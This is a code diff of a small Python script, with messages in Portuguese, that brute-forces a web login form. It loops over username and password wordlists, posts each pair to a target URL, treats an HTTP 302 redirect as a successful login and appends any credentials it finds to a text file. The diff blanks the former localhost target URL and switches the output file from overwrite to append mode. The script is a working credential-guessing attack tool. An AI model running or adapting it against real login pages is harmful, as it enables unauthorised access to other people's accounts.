@@ -1,7 +1,9 @@
+#BF
+
 import requests
 import os
 
-url = "http://127.0.0.1:5000/login"
+url = ""
 
 users = open("txt/wordlists/username.txt", 'r')
 password = open ("txt/wordlists/password.txt", 'r')
@@ -21,7 +23,7 @@ for user in users:
         if resposta.status_code == 302 or resposta.is_redirect:
             print(f"Credenciais encontradas: {user}: {senha}")
 
-            with open ("txt/wordlists/credencial.txt", 'w') as file:
+            with open ("txt/wordlists/credencial.txt", 'a') as file:
                 file.write(f"{url} - {user}: {senha}\n")
 
             exit()
